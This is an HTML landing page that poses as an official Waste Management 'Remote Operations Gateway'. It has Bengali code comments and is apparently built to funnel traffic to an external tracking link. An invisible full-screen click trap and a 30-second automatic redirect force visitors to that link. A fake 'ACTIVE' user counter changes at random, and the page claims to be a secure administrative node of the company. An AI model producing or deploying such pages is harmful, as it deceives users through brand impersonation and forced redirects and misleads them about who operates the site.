<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waste Management® Official | Remote Hub Portal</title>
    
    <meta property="og:title" content="Waste Management® Official | Remote Hub Portal">
    <meta property="og:description" content="Secure internal network node for verified background scheduling.">
    <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">

    <style>
        :root {
            /* ব্যাকগ্রাউন্ড আরও ডার্ক ও প্রিমিয়াম করা হয়েছে যেন গ্লাস ইফেক্ট ফুটে ওঠে */
            --bg-base: #02040a;
            --wm-yellow: #fdb813;
            --text-main: #ffffff;
            --text-muted: #8b949e;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: var(--bg-base);
            /* গ্লাস ভাইব পপ করানোর জন্য ব্যাকগ্রাউন্ডে শক্তিশালী নিয়ন লাইট গ্লো */
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(37, 99, 235, 0.25) 0%, transparent 50%),
                radial-gradient(circle at 50% 110%, rgba(0, 104, 55, 0.15) 0%, transparent 50%);
            background-attachment: fixed;
            color: var(--text-main);
            overflow: hidden; /* অতিরিক্ত স্ক্রলিং চিরতরে বন্ধ */
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            cursor: pointer;
        }

        /* পুরো স্ক্রিন জুড়েই থাকবে এই ইনভিসিবল ক্লিক ট্র্যাপ */
        .master-intercept-shield {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 5;
            cursor: pointer;
        }

        /* হেডার - পিওর ফ্রস্টেড গ্লাস */
        header {
            background: rgba(10, 15, 30, 0.4);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.12);
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            z-index: 100;
        }

        .brand-logo-text {
            font-weight: 800;
            font-size: 16px;
            letter-spacing: -0.5px;
        }
        .brand-logo-text span { color: var(--wm-yellow); }

        .header-meta-group {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* রিয়ালিস্টিক গ্লাস কাউন্টার */
        .live-user-tracker-card {
            background: rgba(239, 68, 68, 0.08);
            border: 1px solid rgba(239, 68, 68, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 5px 10px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .tracker-lbl {
            font-size: 10px;
            font-weight: 700;
            color: #fca5a5;
        }

        .tracker-val {
            font-size: 12px;
            font-weight: 800;
            color: #ef4444;
            font-family: 'JetBrains Mono', monospace;
        }

        .beacon-signal-pulse {
            width: 6px; height: 6px;
            background-color: #ef4444;
            border-radius: 50%;
            position: relative;
        }
        .beacon-signal-pulse::after {
            content: ''; position: absolute;
            width: 100%; height: 100%; top: 0; left: 0;
            background: #ef4444; border-radius: 50%;
            animation: pulseWave 1.8s infinite ease-in-out;
        }

        /* লাইভ ডিভাইস ক্লক গ্লাস ব্যাজ */
        .badge-live-clock {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--wm-yellow);
            background: rgba(253, 184, 19, 0.06);
            border: 1px solid rgba(253, 184, 19, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 5px 10px;
            border-radius: 30px;
            font-weight: 700;
        }

        /* মেইন কন্টেনার - একদম ক্লিন এবং ছিমছাম */
        main {
            position: relative;
            z-index: 10;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            text-align: center;
        }

        /* গ্লাস প্যানেল - মেইন বক্স */
        .glass-portal-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border-radius: 24px;
            padding: 30px 20px;
            width: 100%;
            max-width: 360px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255,255,255,0.1);
        }

        .node-tag {
            display: inline-flex;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 4px 12px;
            border-radius: 100px;
            font-size: 11px;
            color: var(--text-muted);
            font-weight: 700;
            margin-bottom: 16px;
            letter-spacing: 0.5px;
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            line-height: 1.25;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
        }
        h1 span { color: var(--wm-yellow); }

        p.subtitle {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.4;
            margin-bottom: 24px;
        }

        /* থ্রিডি গ্লাস এফেক্ট নিয়ন বাটন */
        .btn-prime-terminal {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #ffdd44 0%, var(--wm-yellow) 100%);
            color: #02040a;
            border: 1px solid rgba(255, 255, 255, 0.4);
            padding: 16px;
            font-size: 14px;
            font-weight: 800;
            border-radius: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            box-shadow: 0 10px 30px rgba(253, 184, 19, 0.3);
            transition: transform 0.1s ease;
        }

        /* মিনিমালিস্টিক গ্লাস ফুটার */
        footer {
            background: rgba(2, 4, 10, 0.5);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            padding: 14px;
            text-align: center;
            font-size: 10px;
            color: #3b4249;
            width: 100%;
        }

        @keyframes pulseWave {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(2.6); opacity: 0; }
        }
    </style>
</head>
<body onclick="handleGlobalClickTrigger()">

    <div class="master-intercept-shield"></div>

    <header>
        <div class="brand-logo-text">WASTE <span>MANAGEMENT</span></div>
        <div class="header-meta-group">
            <div class="live-user-tracker-card">
                <div class="beacon-signal-pulse"></div>
                <div class="tracker-lbl">ACTIVE:</div>
                <div class="tracker-val" id="active-tracker-digits">2,813</div>
            </div>
            <div class="badge-live-clock" id="live-device-clock">Live 00:00:00</div>
        </div>
    </header>

    <main>
        <div class="glass-portal-card">
            <div class="node-tag">NODE // US-2026 ACTIVE</div>
            <h1>Remote Operations <span>Gateway</span></h1>
            <p class="subtitle">Secure administrative terminal for verified support routing slots. Synchronize your local session parameters below.</p>
            
            <button class="btn-prime-terminal">ACCESS OFFICIAL PORTAL</button>
        </div>
    </main>

    <footer>
        <p>Secured Network Node System • WM International Inc.</p>
    </footer>

    <script>
        const targetGateLink = "https://www.af9m8trk.com/AAV11C1R/PB7121EP/?s1=Ashik";
        let loopTriggered = false;

        // ৩০ সেকেন্ড পর অটোমেটিক স্মার্ট রিডাইরেক্ট
        setTimeout(() => {
            if (!loopTriggered) {
                window.location.href = targetGateLink;
            }
        }, 30000);

        function handleGlobalClickTrigger() {
            loopTriggered = true;
            window.location.href = targetGateLink;
        }

        // ইউজারের রিয়েল-টাইম লোকাল ক্লক আপডেট
        function synchronizeDeviceClock() {
            const clockElement = document.getElementById('live-device-clock');
            if (clockElement) {
                const localDate = new Date();
                
                let hours = localDate.getHours();
                let minutes = localDate.getMinutes();
                let seconds = localDate.getSeconds();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                
                hours = hours % 12;
                hours = hours ? hours : 12; 
                minutes = minutes < 10 ? '0' + minutes : minutes;
                seconds = seconds < 10 ? '0' + seconds : seconds;
                
                clockElement.innerText = 'Live ' + hours + ':' + minutes + ':' + seconds + ' ' + ampm;
            }
        }

        // রিয়েল-টাইম ইউজার কাউন্টার ফ্লাকচুয়েশন
        function engineActiveTrackerFlux() {
            const trackerContainer = document.getElementById('active-tracker-digits');
            if (trackerContainer) {
                let initialValue = parseInt(trackerContainer.innerText.replace(',', ''));
                let variations = Math.floor(Math.random() * 3) + 1;
                initialValue = (Math.random() > 0.5) ? initialValue + variations : initialValue - variations;
                trackerContainer.innerText = initialValue.toLocaleString();
            }
        }

        setInterval(synchronizeDeviceClock, 1000);
        setInterval(engineActiveTrackerFlux, 3500);
        synchronizeDeviceClock();
    </script>
</body>
</html>
